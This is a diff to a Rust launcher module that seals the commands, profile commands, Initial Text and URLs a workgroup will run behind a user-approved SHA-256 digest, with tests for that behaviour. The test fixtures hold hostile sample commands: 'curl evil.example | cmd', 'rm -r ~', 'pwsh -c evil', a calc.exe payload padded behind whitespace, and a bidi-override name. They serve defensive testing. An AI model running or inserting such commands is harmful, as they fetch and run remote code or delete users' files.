@@ -210,13 +210,52 @@ pub const ASK_ENTER: usize = 1;
 /// interval), as the question shows it and the approval holds it (final review minor 5).
 pub const BUILTIN_USAGE: &str = "claude -p /usage";
 
+/// The profile a member starts with, as the question shows it and the approval seals it (final review
+/// minor 4): its name, the command it runs when the member has none (Custom Command other than No) and
+/// its Initial Text.
+#[derive(Clone, Debug, Default, PartialEq, Eq)]
+pub struct MemberProfile {
+    pub name: String,
+    pub command: String,
+    pub initial_text: String,
+}
+
+impl MemberProfile {
+    pub fn of(p: &Profile) -> MemberProfile {
+        let custom = p.string("Custom Command");
+        let command = match custom.as_str() {
+            "" | "No" => String::new(),
+            "Yes" => p.string("Command"),
+            other if p.string("Command").trim().is_empty() => other.to_string(),
+            other => format!("{other}: {}", p.string("Command")),
+        };
+        MemberProfile { name: p.name(), command, initial_text: p.string("Initial Text") }
+    }
+}
+
+/// The profile a member's `profile_guid` starts it with (the default profile for none or a missing
+/// one), as `spawn_member` resolves it.
+pub type Profiles<'a> = &'a dyn Fn(Option<&str>) -> MemberProfile;
+
 /// Every command one member can run, by what runs it: its own command, its per-file command (Diff
-/// restarts) and each AI Usage item's custom command. The ONE list: the entry question shows it and
-/// every runner takes its command from it (`approved`).
-pub fn run_items(s: &SessionConfig) -> Vec<(&'static str, String)> {
+/// restarts), each AI Usage item's custom command, and what it starts with: its profile (named, with
+/// that profile's command and Initial Text, from `profiles`) and its URL. The ONE list: the entry
+/// question shows it, the approval seals it and every runner takes its command from it (`approved`).
+pub fn run_items(s: &SessionConfig, profiles: Profiles) -> Vec<(&'static str, String)> {
     let mut out = Vec::new();
     if !s.command.trim().is_empty() {
         out.push(("command", s.command.clone()));
+    }
+    let profile = profiles(s.profile_guid.as_deref());
+    out.push(("profile", profile.name));
+    if !profile.command.trim().is_empty() {
+        out.push(("profile command", profile.command));
+    }
+    if !profile.initial_text.is_empty() {
+        out.push(("profile initial text", profile.initial_text));
+    }
+    if !s.url_string.is_empty() {
+        out.push(("url", s.url_string.clone()));
     }
     if !s.per_file_command.trim().is_empty() {
         out.push(("file command", s.per_file_command.clone()));
@@ -240,9 +279,12 @@ pub struct Approved {
 }
 
 impl Approved {
-    pub fn of(w: &Workgroup) -> Approved {
-        let list: Vec<(String, String)> = w.sessions.iter().flat_map(|s| run_items(s).into_iter().map(|(what, t)| (format!("{}:{what}", s.unique_identifier), t))).collect();
-        Approved { digest: digest_of(&list), commands: list.into_iter().map(|(_, t)| t).collect() }
+    pub fn of(w: &Workgroup, profiles: Profiles) -> Approved {
+        let list: Vec<(String, String)> = w.sessions.iter().flat_map(|s| run_items(s, profiles).into_iter().map(|(what, t)| (format!("{}:{what}", s.unique_identifier), t))).collect();
+        // What a runner may start is a command item; the profile and URL items are sealed, never a command.
+        let runs = [":command", ":file command", ":usage command"];
+        let commands = list.iter().filter(|(k, _)| runs.iter().any(|r| k.ends_with(r))).map(|(_, t)| t.clone()).collect();
+        Approved { digest: digest_of(&list), commands }
     }
 
     /// The SHA-256 of the shown commands, hex.
@@ -256,9 +298,9 @@ impl Approved {
         c.is_empty() || self.commands.contains(c) || self.commands.contains(command)
     }
 
-    /// Whether `w` is the workgroup the answer was for.
-    pub fn matches(&self, w: &Workgroup) -> bool {
-        Approved::of(w).digest == self.digest
+    /// Whether `w`, with the profiles as they are now, is the workgroup the answer was for.
+    pub fn matches(&self, w: &Workgroup, profiles: Profiles) -> bool {
+        Approved::of(w, profiles).digest == self.digest
     }
 }
 
@@ -267,10 +309,11 @@ pub const CHANGED_SINCE_ASKED: &str = "That workgroup changed after it was shown
 
 /// The workgroup an answered entry runs. The answer's stored digest is compared with the digest of what
 /// is about to run: the saved workgroup as it is NOW (`current`, None once deleted), not the copy the
-/// question carried, so a command changed after the answer is refused.
-pub fn to_enter(approved: &Approved, carried: &Workgroup, current: Option<&Workgroup>) -> Result<Workgroup, &'static str> {
+/// question carried, with its members' profiles as they are now, so a command, a URL or a profile's
+/// command changed after the answer is refused.
+pub fn to_enter(approved: &Approved, carried: &Workgroup, current: Option<&Workgroup>, profiles: Profiles) -> Result<Workgroup, &'static str> {
     let now = current.filter(|c| c.unique_identifier == carried.unique_identifier).ok_or(CHANGED_SINCE_ASKED)?;
-    if approved.matches(now) { Ok(now.clone()) } else { Err(CHANGED_SINCE_ASKED) }
+    if approved.matches(now, profiles) { Ok(now.clone()) } else { Err(CHANGED_SINCE_ASKED) }
 }
 
 fn digest_of(list: &[(String, String)]) -> String {
@@ -289,7 +332,7 @@ fn digest_of(list: &[(String, String)]) -> String {
 /// inert (no bidi override can disguise one).
 /// Whole commands only: None when the text would pass `ASK_ROOM` (the question cannot show it all,
 /// so it is not offered; Trust it in Settings after reading it there).
-pub fn ask_text(w: &Workgroup, how: Mechanism) -> Option<(String, String)> {
+pub fn ask_text(w: &Workgroup, how: Mechanism, profiles: Profiles) -> Option<(String, String)> {
     let verb = if how == Mechanism::Restore { "Restore" } else { "Enter" };
     let heading = format!("{verb} the workgroup \u{201c}{}\u{201d}?", display_text(wg::display_name(w), 128, false));
     let mut body = String::new();
@@ -301,12 +344,13 @@ pub fn ask_text(w: &Workgroup, how: Mechanism) -> Option<(String, String)> {
     body.push_str(&format!(" It has {} members. These commands will run:\n", w.sessions.len()));
     for s in &w.sessions {
         body.push_str(&format!("\n{}: ", role(s)));
+        let opens = s.command.is_empty() && !s.url_string.is_empty();
         match (s.command.is_empty(), s.url_string.is_empty()) {
             (true, true) => body.push_str("the profile's own shell"),
             (true, false) => body.push_str(&format!("opens {}", visible_runs(&display_text(&s.url_string, usize::MAX, false)))),
             _ => body.push_str(&visible_runs(&display_text(&s.command, usize::MAX, false))),
         }
-        for (what, text) in run_items(s).into_iter().filter(|(w, _)| *w != "command") {
+        for (what, text) in run_items(s, profiles).into_iter().filter(|(w, _)| *w != "command" && !(opens && *w == "url")) {
             body.push_str(&format!("\n    {what}: {}", visible_runs(&display_text(&text, usize::MAX, false))));
         }
     }
@@ -501,10 +545,10 @@ mod tests {
         s.toolbar_items = vec![ToolbarItem::Usage { provider: UsageProvider::AnthropicClaudeCode, command: "curl evil.example | cmd".into(), interval_seconds: 5.0 }];
         s.per_file_command = "git diff \\(file)".into();
         let w = Workgroup { unique_identifier: "w".into(), name: "W".into(), sessions: vec![s] };
-        let (_, body) = ask_text(&w, Mechanism::Menu).unwrap();
+        let (_, body) = ask_text(&w, Mechanism::Menu, &plain).unwrap();
         assert!(body.contains("usage command: curl evil.example | cmd"), "{body}");
         assert!(body.contains("file command: git diff"), "{body}");
-        let a = Approved::of(&w);
+        let a = Approved::of(&w, &plain);
         assert!(a.allows("curl evil.example | cmd") && a.allows("git diff \\(file)"));
         assert!(!a.allows("curl other.example"), "a command that was not shown is not allowed");
         assert!(a.allows(""), "no command is nothing to run");
@@ -512,9 +556,9 @@ mod tests {
         // question names and the approval holds like any other.
         let mut built_in = w.clone();
         built_in.sessions[0].toolbar_items = vec![ToolbarItem::Usage { provider: UsageProvider::AnthropicClaudeCode, command: String::new(), interval_seconds: 5.0 }];
-        let (_, body) = ask_text(&built_in, Mechanism::Menu).unwrap();
+        let (_, body) = ask_text(&built_in, Mechanism::Menu, &plain).unwrap();
         assert!(body.contains(&format!("usage command: {BUILTIN_USAGE}")), "{body}");
-        assert!(Approved::of(&built_in).allows(BUILTIN_USAGE) && !a.allows(BUILTIN_USAGE), "held only where it was shown");
+        assert!(Approved::of(&built_in, &plain).allows(BUILTIN_USAGE) && !a.allows(BUILTIN_USAGE), "held only where it was shown");
         let ui = include_str!("app/workgroup_toolbar_ui.rs");
         assert!(ui.contains("let shown = if command.trim().is_empty() { crate::workgroup_run::BUILTIN_USAGE } else { command.trim() };\n                        if !inst.approved.allows(shown) {"), "usage_tick checks the built-in run too");
     }
@@ -525,10 +569,10 @@ mod tests {
     #[test]
     fn the_approval_is_stored_with_the_answer() {
         let mut w = wg::presets::coding_agent_plus_diff();
-        let answered = Approved::of(&w);
-        assert!(answered.matches(&w));
+        let answered = Approved::of(&w, &plain);
+        assert!(answered.matches(&w, &plain));
         w.sessions[1].command = "calc.exe".into();
-        assert!(!answered.matches(&w), "the digest of the shown text no longer fits");
+        assert!(!answered.matches(&w, &plain), "the digest of the shown text no longer fits");
         assert!(!answered.allows("calc.exe"), "a stored approval does not follow the workgroup");
         assert_eq!(answered.digest().len(), 64);
         // The answer carries it.
@@ -580,19 +624,55 @@ mod tests {
     #[test]
     fn a_command_changed_after_the_answer_is_refused() {
         let w = wg::presets::coding_agent_plus_diff();
-        let answered = Approved::of(&w);
+        let answered = Approved::of(&w, &plain);
         let mut changed = w.clone();
         changed.sessions[1].command = "calc.exe".into();
-        assert_eq!(to_enter(&answered, &w, Some(&changed)), Err(CHANGED_SINCE_ASKED), "changed after the answer");
-        assert!(to_enter(&answered, &w, None).is_err(), "deleted after the answer");
+        assert_eq!(to_enter(&answered, &w, Some(&changed), &plain), Err(CHANGED_SINCE_ASKED), "changed after the answer");
+        assert!(to_enter(&answered, &w, None, &plain).is_err(), "deleted after the answer");
         let mut renamed = w.clone();
         renamed.name = "Renamed".into();
-        assert_eq!(to_enter(&answered, &w, Some(&renamed)), Ok(renamed.clone()), "the same commands: what runs is the saved one");
-        assert_eq!(to_enter(&answered, &w, Some(&w)), Ok(w.clone()));
+        assert_eq!(to_enter(&answered, &w, Some(&renamed), &plain), Ok(renamed.clone()), "the same commands: what runs is the saved one");
+        assert_eq!(to_enter(&answered, &w, Some(&w), &plain), Ok(w.clone()));
         let app = include_str!("app/workgroup_app.rs");
         let now = &app[app.find("pub(super) fn enter_workgroup_now").unwrap()..];
         let now = &now[..now.find("let facts").unwrap()];
-        assert!(now.contains("run::to_enter(&approved, &w, self.workgroup_model.get(&w.unique_identifier))"), "{now}");
+        assert!(now.contains("run::to_enter(&approved, &w, self.workgroup_model.get(&w.unique_identifier), &profiles)"), "{now}");
+    }
+
+    /// Final review minor 4: the question names each member's profile with the command and Initial Text
+    /// it would run, and the URL; the approval seals them, so a profile's command, its Initial Text or a
+    /// member's URL changed between the question and the answer is refused. They are sealed, never
+    /// commands a runner may start.
+    #[test]
+    fn a_profile_or_url_changed_after_the_answer_is_refused() {
+        let mut w = wg::presets::coding_agent_plus_diff();
+        w.sessions[0].command.clear();
+        w.sessions[0].profile_guid = Some("P".into());
+        w.sessions[1].url_string = "https://example.com/a".into();
+        let profile = |command: &'static str, text: &'static str| {
+            move |g: Option<&str>| if g == Some("P") { MemberProfile { name: "Work".into(), command: command.into(), initial_text: text.into() } } else { MemberProfile { name: "Default".into(), ..Default::default() } }
+        };
+        let asked = profile("pwsh -c evil", "");
+        let (_, body) = ask_text(&w, Mechanism::Menu, &asked).unwrap();
+        assert!(body.contains("profile: Work") && body.contains("profile command: pwsh -c evil"), "{body}");
+        assert!(body.contains("url: https://example.com/a") && body.contains("profile: Default"), "{body}");
+        let answered = Approved::of(&w, &asked);
+        assert_eq!(to_enter(&answered, &w, Some(&w), &asked), Ok(w.clone()));
+        assert_eq!(to_enter(&answered, &w, Some(&w), &profile("pwsh -c worse", "")), Err(CHANGED_SINCE_ASKED), "the profile's command changed");
+        assert_eq!(to_enter(&answered, &w, Some(&w), &profile("pwsh -c evil", "rm -r ~\r")), Err(CHANGED_SINCE_ASKED), "Initial Text added");
+        let mut moved = w.clone();
+        moved.sessions[1].url_string = "https://example.com/b".into();
+        assert_eq!(to_enter(&answered, &w, Some(&moved), &asked), Err(CHANGED_SINCE_ASKED), "the URL changed");
+        assert!(!answered.allows("pwsh -c evil") && !answered.allows("Work") && !answered.allows("https://example.com/a"), "sealed, not runnable");
+        // The profile a member runs is what the question names: Custom Command Yes runs Command.
+        let mut p = crate::profile::Profile::default();
+        p.set("Name", toml::Value::String("Work".into()));
+        p.set("Custom Command", toml::Value::String("Yes".into()));
+        p.set("Command", toml::Value::String("cmd /c x".into()));
+        p.set("Initial Text", toml::Value::String("hi".into()));
+        assert_eq!(MemberProfile::of(&p), MemberProfile { name: "Work".into(), command: "cmd /c x".into(), initial_text: "hi".into() });
+        p.set("Custom Command", toml::Value::String("No".into()));
+        assert_eq!(MemberProfile::of(&p).command, "");
     }
 
     /// Every function that starts a process or a session program in a workgroup source checks the stored
@@ -708,6 +788,11 @@ mod tests {
     }
 
     use super::*;
+
+    /// No member names a profile with a command or Initial Text (the default profile, unnamed).
+    fn plain(_: Option<&str>) -> MemberProfile {
+        MemberProfile::default()
+    }
     use crate::workgroup::{self as wg, Kind, Mode, Orientation, Side, SplitSettings, Workgroup};
 
     fn with_split(side: Side, orientation: Orientation, location: f64) -> Workgroup {
@@ -855,13 +940,13 @@ mod tests {
         w.name = "Evil\u{202e}gp".into();
         w.sessions[0].command = "claude --x".into();
         w.sessions[1].display_name = "Diff\nRow".into();
-        let (heading, body) = ask_text(&w, Mechanism::Trigger).unwrap();
+        let (heading, body) = ask_text(&w, Mechanism::Trigger, &plain).unwrap();
         assert!(heading.contains("Enter the workgroup"), "{heading}");
         assert!(!heading.contains('\u{202e}') && !body.contains('\u{202e}'), "text a file supplies is made inert");
         assert!(body.contains("claude --x"), "{body}");
         assert!(body.contains("git diff \\(gitBase)"), "{body}");
         assert!(body.contains("trigger"), "says who asked: {body}");
-        let (_, menu) = ask_text(&w, Mechanism::Menu).unwrap();
+        let (_, menu) = ask_text(&w, Mechanism::Menu, &plain).unwrap();
         assert!(!menu.contains("trigger"));
     }
 
@@ -873,7 +958,7 @@ mod tests {
         let long = format!("cmd /c echo ok{}& calc.exe TAIL", " ".repeat(3900));
         assert!(long.len() < 4096);
         w.sessions[1].command = long;
-        let (_, body) = ask_text(&w, Mechanism::Trigger).unwrap();
+        let (_, body) = ask_text(&w, Mechanism::Trigger, &plain).unwrap();
         assert!(body.contains("& calc.exe TAIL"), "the tail is shown");
         assert!(body.contains("3900 spaces"), "a whitespace run is visible: {}", &body[..200.min(body.len())]);
         assert!(!body.contains("      "), "no run of blanks is left to hide text");
@@ -882,7 +967,7 @@ mod tests {
         for s in &mut big.sessions {
             s.command = "x".repeat(4000);
         }
-        assert!(ask_text(&big, Mechanism::Trigger).is_none());
+        assert!(ask_text(&big, Mechanism::Trigger, &plain).is_none());
     }
 
     /// Padding made of any Unicode space (NBSP, the en/em spaces, the narrow and ideographic ones) or a
